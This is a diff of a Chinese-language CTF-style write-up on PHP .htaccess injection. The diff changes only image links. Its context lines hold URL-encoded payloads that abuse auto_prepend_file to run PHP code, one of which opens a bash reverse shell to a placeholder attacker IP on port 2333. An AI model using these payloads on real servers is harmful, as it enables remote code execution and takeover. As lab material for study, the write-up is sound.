@@ -1,4 +1,4 @@
-![[Pasted image 20230226142322.png|500]]
+![](<./img/Pasted image 20230226142322.png>)
 
 ```php
  <?php
@@ -46,7 +46,7 @@
 /info.php
 ```
 
-![[Pasted image 20230226142803.png]]
+![](<./img/Pasted image 20230226142803.png>)
 
 并没有被解析
 
@@ -73,7 +73,7 @@ url编码
 /?filename=.htaccess&content=php_value+auto_prepend_fi%5C%0D%0Ale+.htaccess%0D%0A%23%3C%3Fphp+phpinfo()%3B%3F%3E%0D%0A%23%5C
 ```
 
-![[Pasted image 20230226151014.png|800]]
+![](<./img/Pasted image 20230226151014.png>)
 
 同理可弹shell
 
@@ -90,6 +90,6 @@ url编码
 /?filename=.htaccess&content=php_value+auto_prepend_fi%5C%0D%0Ale+.htaccess%0D%0A%23%3C%3Fphp+system(%27bash+%2Dc+%22bash+%2Di+%3E%26+%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F2333+0%3E%261%22%27)%3B%3F%3E%0D%0A%23%5C
 ```
 
-![[Pasted image 20230226154124.png|800]]
+![](<./img/Pasted image 20230226154124.png>)
 
 #Web #PHP #htaccess #RCE #reverse_shell
